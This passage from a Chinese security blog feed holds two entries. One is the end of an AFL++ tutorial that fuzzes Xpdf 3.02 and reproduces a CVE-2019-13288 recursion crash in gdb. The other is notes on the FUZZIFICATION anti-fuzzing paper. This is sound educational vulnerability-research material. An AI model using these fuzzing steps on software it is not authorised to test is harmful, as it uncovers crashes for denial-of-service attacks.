build-essential<br></code></pre></td></tr></table></figure><p>下载Xpdf 3.02:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">wget</span> https://dl.xpdfreader.com/old/xpdf-<span class="hljs-number">3</span>.<span class="hljs-number">02</span>.tar.gz<br><span class="hljs-attribute">tar</span> -xvzf xpdf-<span class="hljs-number">3</span>.<span class="hljs-number">02</span>.tar.gz<br></code></pre></td></tr></table></figure><p>Build Xpdf:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">cd</span> xpdf-<span class="hljs-number">3.02</span><br>sudo apt <span class="hljs-keyword">update</span> &amp;&amp; sudo apt install -<span class="hljs-keyword">y</span> build-essential gcc<br>./configure --prefix=<span class="hljs-string">&quot;$HOME/fuzzing_xpdf/install/&quot;</span><br><span class="hljs-keyword">make</span><br><span class="hljs-keyword">make</span> install<br></code></pre></td></tr></table></figure><blockquote><p>./configure make make install <a href>具体解释可见</a></p></blockquote><p>为了测试，先下载测试样例</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd <span class="hljs-variable">$HOME</span>/fuzzing_xpdf<br>mkdir pdf_examples &amp;&amp; cd pdf_examples<br>wget https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/mozilla/</span>pdf.js-sample-files<span class="hljs-regexp">/raw/m</span>aster/helloworld.pdf<br>wget http:<span class="hljs-regexp">//</span>www.africau.edu<span class="hljs-regexp">/images/</span>default/sample.pdf<br>wget https:<span class="hljs-regexp">//</span>www.melbpc.org.au<span class="hljs-regexp">/wp-content/u</span>ploads<span class="hljs-regexp">/2017/</span><span class="hljs-number">10</span>/small-example-pdf-file.pdf<br></code></pre></td></tr></table></figure><p>测试pdfinfo二进制文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/i</span>nstall<span class="hljs-regexp">/bin/</span>pdfinfo -box -meta <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/</span>pdf_examples/helloworld.pdf<br></code></pre></td></tr></table></figure><p>You should see something like this:</p><h2 id="安装AFL"><a href="#安装AFL" class="headerlink" title="安装AFL++"></a>安装AFL++</h2><p>安装必要的依赖</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">sudo apt-get update<br>sudo apt-get install -y build-essential python3-dev automake git flex bison libglib2.<span class="hljs-number">0</span>-dev libpixman-<span class="hljs-number">1</span>-dev python3-setuptools<br>sudo apt-get install -y lld-<span class="hljs-number">11</span> llvm-<span class="hljs-number">11</span> llvm-<span class="hljs-number">11</span>-dev clang-<span class="hljs-number">11</span><span class="hljs-operator"> || </span>sudo apt-get install -y lld llvm llvm-dev clang <br>sudo apt-get install -y gcc-<span class="hljs-constructor">$(<span class="hljs-params">gcc</span> --<span class="hljs-params">version</span>|<span class="hljs-params">head</span> -<span class="hljs-params">n1</span>|<span class="hljs-params">sed</span> &#x27;<span class="hljs-params">s</span><span class="hljs-operator">/</span>.<span class="hljs-operator">*</span> <span class="hljs-operator">/</span><span class="hljs-operator">/</span>&#x27;|<span class="hljs-params">sed</span> &#x27;<span class="hljs-params">s</span><span class="hljs-operator">/</span>\..<span class="hljs-operator">*</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span>&#x27;)</span>-plugin-dev libstdc++-<span class="hljs-constructor">$(<span class="hljs-params">gcc</span> --<span class="hljs-params">version</span>|<span class="hljs-params">head</span> -<span class="hljs-params">n1</span>|<span class="hljs-params">sed</span> &#x27;<span class="hljs-params">s</span><span class="hljs-operator">/</span>.<span class="hljs-operator">*</span> <span class="hljs-operator">/</span><span class="hljs-operator">/</span>&#x27;|<span class="hljs-params">sed</span> &#x27;<span class="hljs-params">s</span><span class="hljs-operator">/</span>\..<span class="hljs-operator">*</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span>&#x27;)</span>-dev<br></code></pre></td></tr></table></figure><p>获取和构建AFL++</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">cd</span> $HOME<br>git clone http<span class="hljs-variable">s:</span>//github.<span class="hljs-keyword">com</span>/AFLplusplus/AFLplusplus &amp;&amp; <span class="hljs-keyword">cd</span> AFLplusplus<br>export LLVM_CONFIG=<span class="hljs-string">&quot;llvm-config-11&quot;</span><br><span class="hljs-keyword">make</span> distrib<br>sudo <span class="hljs-keyword">make</span> install<br></code></pre></td></tr></table></figure><p>通过输入下面的命令可以查看afl-fuzz的具体命令参数</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">afl-fuzz</span><br></code></pre></td></tr></table></figure><p>可以看到</p><p><img src="/2021/12/03/AFL%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B0/image-20211201204851442.png" alt="image-20211201204851442"></p><h3 id="afl-fuzz命令格式"><a href="#afl-fuzz命令格式" class="headerlink" title="afl-fuzz命令格式"></a><strong>afl-fuzz命令格式</strong></h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">afl-fuzz -i testcase_dir -o findings_dir -- <span class="hljs-regexp">/path/</span>to<span class="hljs-regexp">/tested/</span>program [...program<span class="hljs-string">&#x27;s cmdline...]</span><br></code></pre></td></tr></table></figure><p>用@@会自动替换为输入文件名</p><h3 id="afl-fuzz-基本参数说明："><a href="#afl-fuzz-基本参数说明：" class="headerlink" title="afl-fuzz 基本参数说明："></a><strong>afl-fuzz 基本参数说明：</strong></h3><ul><li><p>-i：指定测试样本所在目录；</p></li><li><p>-o：指定测试结果存放目录；</p></li><li><p>-M：运行主(Master) Fuzzer；</p></li><li><p>-S：运行从属(Slave) Fuzzer；</p></li><li><p>-t：设置程序运行超时值，单位为 ms；</p></li><li><p>-m：最大运行内存，单位为 MB；</p></li><li><p>-s： 表示要使用的静态随机种子</p></li><li><p>@@ 占位符，AFL 将用每个输入文件名替换它</p></li></ul><p>更多参数信息可通过命令<code>afl-fuzz</code>来得知</p><h2 id="开始fuzzing"><a href="#开始fuzzing" class="headerlink" title="开始fuzzing"></a>开始fuzzing</h2><p>前面说到，AFL从源码编译程序时进行插桩，以记录代码覆盖率。这个工作需要使用其提供的两种编译器的wrapper编译目标程序，和普通的编译过程没有太大区别</p><p>首先，我们清理所有以前编译的目标文件和可执行文件：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">rm -r <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/i</span>nstall<br>cd <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/</span>xpdf-<span class="hljs-number">3.02</span>/<br>make clean<br></code></pre></td></tr></table></figure><p>现在我们开始用<strong>afl-clang-fast</strong> 用编译xpdf:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">LLVM_CONFIG</span>=<span class="hljs-string">&quot;llvm-config-11&quot;</span><br><span class="hljs-attribute">CC</span>=<span class="hljs-variable">$HOME</span>/AFLplusplus/afl-clang-fast <span class="hljs-attribute">CXX</span>=<span class="hljs-variable">$HOME</span>/AFLplusplus/afl-clang-fast++ ./configure <span class="hljs-attribute">--prefix</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/fuzzing_xpdf/install/&quot;</span><br>make<br>make install<br></code></pre></td></tr></table></figure><p>现在我们可以就可以用下面的命令开始fuzzing了</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">afl-fuzz -i <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/</span>pdf_examples<span class="hljs-regexp">/ -o $HOME/</span>fuzzing_xpdf<span class="hljs-regexp">/out/</span> -s <span class="hljs-number">123</span> -- <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/i</span>nstall<span class="hljs-regexp">/bin/</span>pdftotext @@ <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/</span>output<br></code></pre></td></tr></table></figure><p>对于每个输入文件，the fuzzer都会执行下面的命令</p><p><code>$HOME/fuzzing_xpdf/install/bin/pdftotext &lt;input-file-name&gt; $HOME/fuzzing_xpdf/output</code> </p><blockquote><p>如果遇到错误 <strong><em>“Hmm, your system is configured to send core dump notifications to an external utility…”</em>,</strong> </p><p>这是因为在执行<code>afl-fuzz</code>前，如果系统配置为将核心转储文件（core）通知发送到外部程序。 将导致将崩溃信息发送到Fuzzer之间的延迟增大，进而可能将崩溃被误报为超时，所以我们得临时修改<code>core_pattern</code>文件，如下所示：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo su<br>echo core &gt;<span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>core_pattern<br><span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure></blockquote><p>成功开始fuzzing后我们可以看到下面的界面</p><p><img src="/2021/12/03/AFL%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B0/image-20211201154932423.png" alt="image-20211201154932423"></p><p>等待……三个多小时后终于出现了一个crash</p><p><img src="/2021/12/03/AFL%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B0/image-20211201201505518.png" alt="image-20211201201505518"></p><h2 id="crash复现"><a href="#crash复现" class="headerlink" title="crash复现"></a>crash复现</h2><p>在$HOME/fuzzing_xpdf/out/文件夹下我们可以我们的crash</p><p><img src="/2021/12/03/AFL%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B0/image-20211201201841167.png" alt="image-20211201201841167"></p><p>用这个crash作为input来进行复现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs terminal">/home/zino/fuzzing_xpdf/install/bin/pdftotext &#x27;/home/zino/fuzzing_xpdf/out/default/crashes/id:000000,sig:11,src:001820,time:12475087,op:havoc,rep:8&#x27; /home/zino/fuzzing_xpdf/output<br></code></pre></td></tr></table></figure><p><img src="/2021/12/03/AFL%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B0/image-20211201202149422.png" alt="image-20211201202149422"></p><p>可以看到，这个crash会导致段错误并导致程序崩溃。</p><p>我们用gdb来调试一下，看一下原因</p><p>首先需要清除原先的二进制文件，重新构建xpdf以加入调试信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs terminal">rm -r $HOME/fuzzing_xpdf/install<br>cd $HOME/fuzzing_xpdf/xpdf-3.02/<br>make clean<br>CFLAGS=&quot;-g -O0&quot; CXXFLAGS=&quot;-g -O0&quot; ./configure --prefix=&quot;$HOME/fuzzing_xpdf/install/&quot;<br>make<br>make install<br></code></pre></td></tr></table></figure><p>然后就可以用GDB调试了</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">gdb --args <span class="hljs-regexp">/home/</span>zino<span class="hljs-regexp">/fuzzing_xpdf/i</span>nstall<span class="hljs-regexp">/bin/</span>pdftotext <span class="hljs-string">&#x27;/home/zino/fuzzing_xpdf/out/default/crashes/id:000000,sig:11,src:001820,time:12475087,op:havoc,rep:8&#x27;</span> <span class="hljs-regexp">/home/</span>zino<span class="hljs-regexp">/fuzzing_xpdf/</span>output<br></code></pre></td></tr></table></figure><p>首先r</p><p>然后卡住后我们用bt(backtrace)回溯</p><p>可以看到getObj函数被反复递归调用，这个漏洞被记录为<a href="https://www.cvedetails.com/cve/CVE-2019-13288/">CVE-2019-13288</a></p><p>原因是在 Xpdf 4.01.01 中，Parser.cc 中的 Parser::getObj() 函数可能会通过精心制作的文件导致无限递归。远程攻击者可以利用它进行 DoS 攻击。</p><p><img src="/2021/12/03/AFL%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B0/image-20211201203904689.png" alt="image-20211201203904689"></p><p>参考链接：</p><p><a href="https://paper.seebug.org/841/#1-afl-gcc">AFL 漏洞挖掘技术漫谈（一）：用 AFL 开始你的第一次 Fuzzing</a></p><p><a href="https://github.com/antonio-morales/Fuzzing101/tree/main/Exercise%201">fuzzing101-exercise1</a></p>]]></content>
    
    
    <categories>
      
      <category>fuzz</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fuzz</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>论文笔记：《FUZZIFICATION:Anti-Fuzzing Techniques》</title>
    <link href="/2021/12/03/Anti-fuzzing%E9%98%85%E8%AF%BB%E8%AE%B0%E5%BD%95/"/>
    <url>/2021/12/03/Anti-fuzzing%E9%98%85%E8%AF%BB%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>Fuzzing是一种软件测试技术，它可以在不了解程序内部结构的情况下快速、自动地探索程序的输入空间。</p><p>它即方便了测试人员检测漏洞，但这意味着也可以被恶意攻击者使用以发现0day漏洞。</p><p>因此，开发人员希望在其产品上应用反模糊技术以阻止攻击者进行模糊测试，其概念类似于使用混淆技术削弱逆向工程。</p><p>在本文中，作者提出了一种二进制保护的新方向，称为FUZZIFICATION。攻击者仍然可以从受FUZZIFICATION保护的二进制文件中查找错误，但<strong>需要花费更多的精力</strong>（例如，CPU，内存和时间）。因此，获得原始二进制文件的开发人员或其他受信任方能够在攻击者之前检测程序错误并合成补丁。</p><h2 id="二、Fuzzification简介"><a href="#二、Fuzzification简介" class="headerlink" title="二、Fuzzification简介"></a>二、Fuzzification简介</h2><p><code>Fuzzification</code>帮助开发人员保护已发布的纯二进制软件能够免受应用最先进模糊技术的攻击者的侵害。在给定性能预算的情况下，这种方法旨在尽可能地阻止对手的模糊测试过程。</p><p><a href="https://www.usenix.org/system/files/sec19fall_jung_prepub.pdf">论文《FUZZIFICATION: Anti-Fuzzing Techniques》pdf下载</a></p><p><a href="https://github.com/sslab-gatech/fuzzification">github地址</a></p><h3 id="技术组件"><a href="#技术组件" class="headerlink" title="技术组件"></a>技术组件</h3><p>其目前包括三个技术组件：</p><ul><li><strong>SpeedBump</strong>：将正常执行的减速放大数百倍到模糊执行，从而降低fuzzing效率。<ul><li>注入<strong>延迟</strong>到正常执行很少到达，但模糊执行经常访问的冷路径。</li></ul></li><li><strong>BranchTrap</strong>：通过隐藏路径和污染覆盖图来干扰反馈逻辑。<ul><li>在程序中插入大量对输入敏感的跳转，因此任何输入变化都会显著地改变执行路径。这将促使基于覆盖率反馈的fuzzing工具将精力花在注入的无bug路径上，而不是真正的路径上。</li></ul></li><li><strong>AntiHybrid</strong>：阻碍污点分析和符号执行。<ul><li>反混合技术的目的是阻止将传统的模糊方法与动态污染分析和符号执行相结合的混合模糊方法。</li></ul></li></ul><p>每一种技术都设计了有效的防御措施，试图阻止敌人绕过FUZZIFICATION。</p><h3 id="应用流程"><a href="#应用流程" class="headerlink" title="应用流程"></a>应用流程</h3><p><img src="/2021/12/03/Anti-fuzzing%E9%98%85%E8%AF%BB%E8%AE%B0%E5%BD%95/image-20211202105624895.png" alt="image-20211202105624895"></p><p>开发人员使用FUZZIFICATION技术创建一个受保护的二进制文件并将其发布给公众。同时，它们将正常编译的二进制文件发送给受信任的一方。攻击者无法通过fuzzing从受保护的二进制文件中找到很多bug，而受信任的一方可以有效地发现更多的bug，从而使得开发人员可以及时修补它们。</p><h2 id="三、设计概述"><a href="#三、设计概述" class="headerlink" title="三、设计概述"></a>三、设计概述</h2><p><img src="/2021/12/03/Anti-fuzzing%E9%98%85%E8%AF%BB%E8%AE%B0%E5%BD%95/image-20211202110549083.png" alt="fuzzification工作流程的概述"></p><ul><li><p>它将<strong>程序源代码</strong>、<strong>一组常用的测试用例</strong>和<strong>开销预算</strong>作为输入，并生成一个由fuzzification技术保护的二进制文件。</p><blockquote><p>请注意，fuzzification依赖于开发人员确定适当的开销预算，这需要在产品的功能和安全性之间取一个平衡。</p></blockquote></li></ul><ol><li><p>我们编译程序来生成一个正常的二进制文件，并用给定的正常测试用例来运行它来收集基本的块频率。频率信息告诉我们哪些基本块很少被正常的执行使用。</p></li><li><p>这个概要文件的基础上，我们将三种fuzzification技术应用到程序中，并生成一个临时的受保护二进制文件。</p></li><li><p>我们再次用给定的正常测试用例来测量临时二进制文件的开销。如果开销超过了开销预算，我们返回到<strong>步骤2</strong>，以减少程序的速度降低程度，例如使用更短的延迟和添加更少的仪器。如果开销远低于预算，我们就相应地增加开销。</p></li><li><p>否则，我们生成受保护的二进制文件。</p></li></ol><h3 id="SpeedBump"><a href="#SpeedBump" class="headerlink" title="SpeedBump"></a>SpeedBump</h3><p><strong>功能：减缓fuzzing的速度，同时最小化对正常执行的影响。</strong></p><blockquote><p>模糊执行过程中经常陷入正常执行很少访问的路径，例如wrong MAGIC等路径。我们称之为冷路径。</p></blockquote><p>在<strong>冷路径</strong>中注入<strong>延迟</strong>将显著降低模糊执行的速度，但不会对常规执行产生太大影响。该文首先用给定的测试用例从正常执行中识别冷路径，然后将精心设计的延迟注入到最少执行的代码路径中，fuzzification会自动确定注入延迟的代码路径数量和每个延迟的长度，以便在正常执行期间，受保护的二进制文件的开销满足用户定义的开销预算。</p><h4 id="1-基本块频率分析"><a href="#1-基本块频率分析" class="headerlink" title="1. 基本块频率分析"></a>1. 基本块频率分析</h4><p>fuzzification生成一个基本块频率分析概要来识别冷路径。</p><p>分析过程遵循三个步骤。</p><ul><li>首先，我们检测目标程序来计算在执行过程中访问的基本块，并生成用于分析的二进制文件。</li><li>其次，使用用户提供的测试用例，我们运行这个二进制文件并收集每个输入访问的基本块。</li><li>第三，FUZZIFICATION对收集到的信息进行分析，以识别有效输入很少执行或从未执行的基本块。这些块在延迟注入中被视为冷路径。</li></ul><h4 id="2-可配置的延迟注入"><a href="#2-可配置的延迟注入" class="headerlink" title="2. 可配置的延迟注入"></a>2. 可配置的延迟注入</h4><p>重复执行以下两个步骤，以确定要<strong>注入延迟</strong>的代码块和<strong>每个延迟的长度</strong>:</p><ul><li>首先在测试执行中注入30ms的延迟到最少执行的基本块的3%。该文作者发现这个设置非常接近最终的评估结果。</li><li>测量生成的二进制代码的开销。如果它没有超过用户定义的开销预算，我们就进入上一步，将更多的延迟注入到更多的基本块中。否则，我们使用前一轮的延迟作为最终结果。我们的speedbumptechnical是特别有用的开发人员一般有一个很好的理解他们的应用程序，以及对fuzzification的要求。</li></ul><p>作者提供了5个选项，开发者可以使用它们来微调SpeedBump的效果。</p><ul><li><code>MAX_OVERHEAD</code>定义了开销预算。开发人员可以指定任何值，只要他们对开销感到满意。</li><li><code>DELAY_LENGTH</code>指定延迟的范围。</li><li><code>INCLUDE_INCORRECT</code>决定是否将延迟注入错误处理基本块(即，只有无效输入执行的位置)，这是默认启用的。</li><li><code>INCLUDE_NON_EXEC</code> and <code>NON_EXEC_RATIO</code>指定是否注入延迟到有多少基本块在测试执行过程中从未执行。当开发人员没有大量的测试用例时，这很有用。</li></ul><h4 id="3-抗分析延迟原语"><a href="#3-抗分析延迟原语" class="headerlink" title="3. 抗分析延迟原语"></a>3. 抗分析延迟原语</h4><p>由于攻击者可能使用程序分析来识别和删除简单的延迟原语(例如，sleep)，作者设计了包含算术操作并与原始代码库相联系的健壮原语。</p><p>作者设计的原语是基于csmith的，<strong>它可以生成随机的、无bug的代码片段</strong>。例如，CSmith可以生成一个函数，该函数接受参数，执行算术操作，并返回特定类型的值。修改了csmith使其生成的代码具有对原始代码的数据依赖和代码依赖。具体来说，就是将原始代码中的一个变量作为参数传递给生成的代码，从生成的代码中引用原始代码，并使用返回值修改原始代码的一个全局变量。</p><p>图5显示了延迟原语的一个示例。它声明了一个局部变量pass_var和并修改全局变量global_var1和global_var2。通过这种方式，作者引入了原始代码和注入代码(第6、9和12行)之间的数据流依赖关系，并在不影响原始程序的情况下更改程序状态。尽管代码是随机生成的，但它通过数据流和控制流依赖关系与原始代码紧密耦合。</p><p><img src="/2021/12/03/Anti-fuzzing%E9%98%85%E8%AF%BB%E8%AE%B0%E5%BD%95/image-20211202205833884.png" alt="image-20211202205833884"></p><h3 id="BranchTrap"><a href="#BranchTrap" class="headerlink" title="BranchTrap"></a>BranchTrap</h3><p><strong>功能：通过隐藏路径和污染覆盖图来干扰反馈逻辑</strong></p><p>代码覆盖率信息被模糊器广泛用于寻找感兴趣的输入并对其进行排序。如果可以插入大量的条件分支，这些分支的条件对微小的输入变化很敏感，那么就可以让这些模糊器勤奋地工作。当模糊过程陷入这些分支陷阱时，基于覆盖率反馈的模糊器将浪费他们的资源去探索(大量)毫无价值的路径。因此，作者提出了一种通过误导或阻断覆盖率反馈来欺骗基于覆盖率反馈的fuzz工具的技术。</p><h4 id="制造大量的条件分支和间接跳转"><a href="#制造大量的条件分支和间接跳转" class="headerlink" title="制造大量的条件分支和间接跳转"></a>制造大量的条件分支和间接跳转</h4><ul><li><p><code>BranchTrap</code><strong>第一种方法</strong>是<strong>制造大量的条件分支和间接跳转</strong>，并将它们注入到原始程序中。</p><p>每个虚构的条件分支都依赖于一些输入字节来决定是否接受分支，而间接跳转则基于用户输入计算它们的目标。</p><p>因此，即使输入稍有变化，程序也会采用不同的执行路径。一旦模糊执行触发伪造的分支，模糊器将设置一个更高的优先级来突变其输入，导致检测更多的假路径。通过这种方式，fuzzer将继续浪费它的资源(例如，CPU和内存)去检查没有结果但没有bug的假路径。</p><p>为了有效地诱导聚焦于假分支的模糊器，作者考虑了以下四个<strong>设计方面</strong>：</p><ul><li>首先，BranchTrap应该制造足够数量的假路径来影响模糊策略。由于模糊器会从一个有趣的输入产生各种不同的变量，假路径应该提供不同的覆盖范围，并直接受到输入的影响，以便模糊器继续挖掘陷阱。</li><li>其次，注入的新路径给常规执行带来最小的开销。</li><li>第三，branchtrap中的路径对于用户输入应该是确定性的，这意味着相同的输入应该经过相同的路径。原因是一些模糊器可以检测并忽略非确定性路径(例如，AFL忽略一个输入，如果两个输入执行采用不同的路径)。</li><li>最后，branchtrap不能被对手轻易地识别或删除。</li></ul><p>BranchTrap的<strong>一个简单实现</strong>是注入一个<strong>跳转表</strong>，并使用一些输入字节作为访问该表的索引。为了强化BranchTrap，作者根据用户输入使每个注入的分支的返回地址多样化。受ROP的启发：通过链接各种小的代码段，将现有代码重用于恶意攻击。作者的方法可能会严重扭曲CFG(control flow graph)，使取消BranchTrap更具挑战性。</p><p>实施过程分为三个<strong>步骤</strong>：</p><ul><li><p>首先，BranchTrap从程序汇编代码中收集函数结尾（function epilogues）。</p></li><li><p>其次，将具有相同指令序列的函数结尾分组到一个跳转表中</p></li><li><p>第三，重写程序集，以便该函数使用一些输入字节作为跳转表索引，从相应的跳转表中检索几个等效的结尾，以实现原始函数的返回。</p></li></ul><p>基于ROP的BranchTrap具有三个<strong>优点</strong>：</p><ul><li>Effective：控制流与用户输入突变一起不断敏感地变化从而<strong>引入足够数量的无效路径</strong>，使coverage feedback效果降低。且BranchTrap<strong>保证路径确定性</strong>，从而使fuzzer不会忽略这些伪造路径。</li><li>Low overhead：轻量级的操作（XOR；解析跳转地址；跳转到gadget）为普通用户造成的开销低。</li><li>Robust：基于ROP的设计大大增加了对手识别或修补二进制文件的复杂性。</li></ul><p><img src="/2021/12/03/Anti-fuzzing%E9%98%85%E8%AF%BB%E8%AE%B0%E5%BD%95/image-20211202213546213.png" alt="image-20211202213546213"></p></li></ul><h4 id="饱和模糊状态"><a href="#饱和模糊状态" class="headerlink" title="饱和模糊状态"></a>饱和模糊状态</h4><ul><li><p>BranchTrap的<strong>第二种方法</strong>是<strong>饱和模糊状态</strong>，这将阻止模糊器学习代码覆盖的进展。</p><p>与诱导模糊器聚焦于无结果的输入的第一种方法不同，这里的目标是防止模糊器发现真正有趣的输入。为了实现这一目标，branchtrap插入大量的分支到程序中，并利用每个模糊器的覆盖表示机制来掩盖新的发现。</p><p>BranchTrap能够为一些很少有人访问的基本块引入大量（例如1万到10万）确定性分支。一旦fuzzer到达这些基本块，其覆盖范围表将迅速填满。在之后执行中大多数新发现的路径将被视为已访问，因此fuzzer将忽略实际有趣的输入。例如，AFL维护一个固定大小的位图(即64KB)来跟踪边缘覆盖。通过插入大量不同的分支，显著增加了位图碰撞的概率，从而降低了覆盖率的不准确性</p></li></ul><h3 id="AntiHybrid"><a href="#AntiHybrid" class="headerlink" title="AntiHybrid"></a>AntiHybrid</h3><p><strong>功能：阻碍污点分析和符号执行。</strong></p><p><strong>符号执行简介</strong></p><blockquote><ul><li><p>符号执行的关键思想就是，使用符号值来代替具体变量，来模拟每个路径来产生每一个执行的可能性，将执行语句的结果整合成若干条数学表达式。对某结果的数学表达式进行求解，就能获得到达该结果的路径。</p><p><img src="/2021/12/03/Anti-fuzzing%E9%98%85%E8%AF%BB%E8%AE%B0%E5%BD%95/image-20211202214447655.png" alt="image-20211202214447655"></p><p><img src="/2021/12/03/Anti-fuzzing%E9%98%85%E8%AF%BB%E8%AE%B0%E5%BD%95/image-20211202214454348.png" alt="image-20211202214454348"></p></li></ul></blockquote><p><strong>污点分析简介</strong></p><blockquote><p>污点分析可以抽象成一个三元组&lt;sources,sinks,sanitizers&gt;的形式,其中,</p><ul><li><p>source 即污点源,代表直接引入不受信任的数据或者机密数据到系统中;</p></li><li><p>sink即污点汇聚点,代表直接产生安全敏感操作(违反数据完整性)或者泄露隐私数据到外界(违反数据保密性);</p></li><li><p>sanitizer即无害处理,代表通过数据加密或者移除危害操作等手段使数据传播不再对软件系统的信息安全产生危害.</p></li></ul><p><img src="/2021/12/03/Anti-fuzzing%E9%98%85%E8%AF%BB%E8%AE%B0%E5%BD%95/image-20211202214657941.png" alt="image-20211202214657941"></p><p>污点分析就是分析程序中由污点源引入的数据是否能够不经无害处理,而直接传播到污点汇聚点</p></blockquote><p>混合模糊测试方法利用符号执行或动态污点分析来提高模糊测试效率。然而，<strong>混合方法具有众所周知的弱点</strong>：</p><ul><li><p>符号执行和污点分析都消耗大量资源，从而限制了它们分析简单程序的能力。</p></li><li><p>符号执行受到<strong>路径爆炸</strong>问题的限制。如果处理符号需要复杂的操作，则符号执行引擎必须详尽地探索和评估所有执行状态。而且大多数符号执行引擎都无法运行到执行路径的末尾。</p><blockquote><p><img src="/2021/12/03/Anti-fuzzing%E9%98%85%E8%AF%BB%E8%AE%B0%E5%BD%95/image-20211202214851909.png" alt="image-20211202214851909"></p></blockquote></li><li><p><strong>DTA</strong>(动态符号执行)分析难以跟踪隐式数据依赖性。例如，为覆盖通过控制通道的数据依赖性，DTA必须在有条件分支之后将taint属性主动传播到任何变量，从而使分析更昂贵而结果不太准确</p></li></ul><h4 id="引入隐式数据流依赖关系"><a href="#引入隐式数据流依赖关系" class="headerlink" title="引入隐式数据流依赖关系"></a>引入隐式数据流依赖关系</h4><p>作者将原始程序中的显式数据流<strong>转换为隐式数据流</strong>，以阻碍污染分析。</p><p>fuzzification首先识别分支条件和有趣的信息sink(例如，strcmp)，然后根据变量类型注入数据流转换代码。</p><p>下图显示了antihybrid的一个示例应用程序，其中<code>array input</code>用于确定分支条件，而strcmp是一个有趣的sink函数。因此，fuzzification使用隐式数据流复制数组(第6-15行)并将原始变量替换为新变量(第16行)。由于转换后的隐式数据流，DTA技术不能识别影响第16行分支条件的正确输入字节。</p><p><img src="/2021/12/03/Anti-fuzzing%E9%98%85%E8%AF%BB%E8%AE%B0%E5%BD%95/image-20211202215315995.png" alt="image-20211202215315995"></p><h4 id="爆炸路径约束"><a href="#爆炸路径约束" class="headerlink" title="爆炸路径约束"></a>爆炸路径约束</h4><p>为了阻止使用符号执行的混合模糊器，fuzzification注入多个代码块来有意地触发路径爆炸。</p><p>具体来说，通过比较原始操作数的<strong>哈希值</strong>来替换每个比较指令。采用哈希函数是因为符号执行<strong>无法轻松确定</strong>具有给定哈希值的<strong>原始操作数</strong>。由于哈希函数通常会在程序执行中引入不可忽略的开销，因此作者利用轻量级的循环冗余校验（CRC）循环迭代来转换分支条件以减少性能开销。</p><p><img src="/2021/12/03/Anti-fuzzing%E9%98%85%E8%AF%BB%E8%AE%B0%E5%BD%95/image-20211202215806017.png" alt="image-20211202215806017"></p>]]></content>
    
    
    <categories>
      
      <category>软件安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fuzz</tag>
      
      <tag>软件安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
